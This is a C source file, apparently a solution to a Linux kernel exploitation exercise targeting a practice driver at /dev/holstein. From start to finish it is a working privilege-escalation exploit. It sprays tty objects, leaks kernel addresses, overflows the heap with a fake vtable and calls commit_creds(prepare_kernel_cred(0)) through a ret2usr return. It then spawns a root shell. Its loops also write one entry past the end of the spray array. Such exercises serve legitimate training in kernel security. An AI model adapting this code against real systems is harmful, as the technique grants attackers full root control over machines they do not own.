#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupt*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;

u64 dev_fd;
u64 spray[100];
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp;
u64 kbase, g_buf;
u64 prepare_kernel_cred = 0x74650, commit_creds = 0x744b0;

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}

void privesc()
{
       __asm__(
        ".intel_syntax noprefix;"
        "mov rax, prepare_kernel_cred;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, commit_creds;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_rsp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

void heap_spray()
{
    for_x(i, 0, 49) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    dev_fd = open("/dev/holstein", O_RDWR);
    for_x(i, 50, 100) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
}

void leak()
{
    char buf[0x500];
    read(dev_fd, buf, 0x500);
    kbase = *(u64 *)(&buf[0x418]) - 0xc38880;
    g_buf = *(u64 *)(&buf[0x438]) - 0x438;
    printf("[*] kbase: 0x%lx\n", kbase);
    printf("[*] g_buf: 0x%lx\n", g_buf);
    prepare_kernel_cred += kbase;
    commit_creds += kbase;
}

void heap_overflow()
{
    char buf[0x500];
    save_state((u64)(&win));
    // fake vtable
    u64 *p = (u64 *)(&buf);
    p[0xc] = (u64)privesc;
    *(u64 *)(&buf[0x418]) = g_buf;
    write(dev_fd, buf, 0x420);
}

void trigger()
{
    for_x(i, 0, 100) ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
    close(dev_fd);
    for_x(i, 0, 100) close(spray[i]);
}

int main()
{
    heap_spray();
    leak();
    heap_overflow();
    trigger();
}
